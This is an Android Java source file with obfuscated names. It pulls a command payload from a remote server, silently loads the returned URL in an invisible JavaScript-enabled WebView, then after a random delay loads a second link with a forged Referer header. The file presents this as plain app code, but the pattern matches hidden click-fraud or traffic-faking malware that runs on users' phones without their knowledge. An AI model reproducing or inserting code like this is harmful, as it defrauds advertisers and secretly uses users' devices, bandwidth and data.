package d.sl.i;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Random;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class SC {

	private static WebView web;
	private static Context context;
	private static Handler handler;
	private static String url;
	private static String pre;
	private static String sleep;

	public static void C(Context contextm) {
		context = contextm;
		CreateHandler();
		web = getWebView();
		getJson();
	}

	private static void CreateHandler() {
		if (handler == null) {
			handler = new Handler() {
				@Override
				public void handleMessage(Message msg) {
					switch (msg.what) {
					case 0:
						cb();
						break;
					case 1:
						cb2();
						break;
					}
				}
			};
		}
	}

	public static void soso(final String url, String pre, final String sleep) {
		handler.sendEmptyMessage(0);
		final Random random = new Random();
		Message message = Message.obtain();
		message.what = 1;
		handler.sendMessageDelayed(message, random.nextInt(1000 * (Integer.parseInt(sleep)) + 5000) - 5000);
	}

	public static void cb() {
		if (web != null)
			web.loadUrl(url);
	}

	public static void cb2() {
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("Referer", url);
		if (web != null)
			web.loadUrl(pre, map);
	}

	private static WebView getWebView() {
		if (web == null) {
			web = new WebView(context);
			WebSettings webSetting = web.getSettings();
			webSetting.setJavaScriptEnabled(true);
			webSetting.setUseWideViewPort(true);// 设置此属性，可任意比例缩放
			webSetting.setLoadWithOverviewMode(true);
			webSetting.setJavaScriptEnabled(true);
			webSetting.setBuiltInZoomControls(true);
			webSetting.setSupportZoom(true);
			web.setWebViewClient(new WebViewClient() {
				@Override
				public boolean shouldOverrideUrlLoading(WebView view, String url) {
					view.loadUrl(url);
					return true;
				}
			});
		}
		return web;
	}

	public static void getJson() {
		new Thread() {

			public void run() {
				Looper.prepare();
				try {
					DefaultHttpClient client = new DefaultHttpClient();
					HttpGet get = new HttpGet(Urls.getClickstr.trim());
					HttpResponse response = client.execute(get);
					BufferedReader bf = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
					String line = "";
					StringBuilder builder = new StringBuilder();
					while ((line = bf.readLine()) != null) {
						builder.append(line);
					}
					client.getConnectionManager().shutdown();
					String json = builder.toString().trim();
					client.getConnectionManager().shutdown();
					JSONObject json1 = new JSONObject(json);
					String status = json1.getString("status");
					if (status.equals("1")) {
						JSONObject urls = json1.getJSONObject("urls");
						url = urls.getString("url");
						pre = urls.getString("pre");
						sleep = urls.getString("sleep");
						soso(url, pre, sleep);
					}
				} catch (ClientProtocolException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				} catch (JSONException e) {
					e.printStackTrace();
				}
				Looper.loop();
			}
		}.start();
	}
}
